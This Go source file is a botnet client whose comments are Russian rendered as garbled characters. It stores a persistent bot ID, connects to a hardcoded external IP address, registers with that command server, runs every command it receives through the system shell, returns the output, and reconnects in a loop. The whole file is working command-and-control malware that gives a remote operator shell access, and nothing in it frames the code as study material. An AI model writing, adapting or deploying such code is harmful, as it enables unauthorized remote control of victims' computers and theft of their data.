package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/google/uuid"
)

const (
	serverAddr = "37.46.230.242:8080" // –ó–∞–º–µ–Ω–∏–ª–∏ localhost –Ω–∞ –≤–Ω–µ—à–Ω–∏–π IP
	idFile     = "bot_id.txt"
)

// –û–ø—Ä–µ–¥–µ–ª—è–µ–º –∏–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ç–æ—Ä –∫–æ–º–∞–Ω–¥ –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –û–°
func getShellAndFlag() (string, string) {
	if runtime.GOOS == "windows" {
		return "cmd", "/C"
	}
	return "sh", "-c"
}

// –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –∏–ª–∏ –∑–∞–≥—Ä—É–∑–∫–∞ —É–Ω–∏–∫–∞–ª—å–Ω–æ–≥–æ ID –±–æ—Ç–∞
func getOrCreateBotID() string {
	if _, err := os.Stat(idFile); err == nil {
		data, err := os.ReadFile(idFile)
		if err != nil {
			log.Fatal("–û—à–∏–±–∫–∞ —á—Ç–µ–Ω–∏—è bot_id.txt:", err)
		}
		return strings.TrimSpace(string(data))
	}

	newID := uuid.New().String()
	err := os.WriteFile(idFile, []byte(newID), 0644)
	if err != nil {
		log.Fatal("–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è bot_id.txt:", err)
	}
	return newID
}

// –í—ã–ø–æ–ª–Ω—è–µ–º –∫–æ–º–∞–Ω–¥—É –∏ –≤–æ–∑–≤—Ä–∞—â–∞–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç
func executeCommand(cmdStr string) string {
	shell, flag := getShellAndFlag()
	cmd := exec.Command(shell, flag, cmdStr)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("–û—à–∏–±–∫–∞: %s", err)
	}
	return string(output)
}

func main() {
	botID := getOrCreateBotID()

	for {
		log.Println("–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ —Å–µ—Ä–≤–µ—Ä—É:", serverAddr)
		conn, err := net.Dial("tcp", serverAddr)
		if err != nil {
			log.Println("‚ùå –û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è:", err)
			time.Sleep(5 * time.Second) // –ñ–¥—ë–º 5 —Å–µ–∫ –ø–µ—Ä–µ–¥ –Ω–æ–≤–æ–π –ø–æ–ø—ã—Ç–∫–æ–π
			continue
		}
		log.Println("‚úÖ –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ —É—Å–ø–µ—à–Ω–æ!")
		defer conn.Close()

		// –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—é
		reg := map[string]string{"type": "register", "bot_id": botID}
		data, _ := json.Marshal(reg)
		conn.Write(append(data, '\n'))

		// –ß–∏—Ç–∞–µ–º –∫–æ–º–∞–Ω–¥—ã
		reader := bufio.NewReader(conn)
		for {
			msg, err := reader.ReadString('\n')
			if err != nil {
				log.Println("‚ö†Ô∏è –û—Ç–∫–ª—é—á–µ–Ω–∏–µ –æ—Ç —Å–µ—Ä–≤–µ—Ä–∞, –ø–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ...")
				break
			}

			var cmd map[string]string
			err = json.Unmarshal([]byte(msg), &cmd)
			if err == nil && cmd["type"] == "command" {
				log.Println("üì© –ü–æ–ª—É—á–µ–Ω–∞ –∫–æ–º–∞–Ω–¥–∞:", cmd["command"])
				result := executeCommand(cmd["command"])

				resp := map[string]string{
					"type":    "response",
					"bot_id":  botID,
					"command": cmd["command"],
					"result":  result,
				}
				data, _ := json.Marshal(resp)
				conn.Write(append(data, '\n'))
			}
		}

		// –ñ–¥—ë–º –ø–µ—Ä–µ–¥ –ø–æ–≤—Ç–æ—Ä–Ω–æ–π –ø–æ–ø—ã—Ç–∫–æ–π –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
		time.Sleep(5 * time.Second)
	}
}
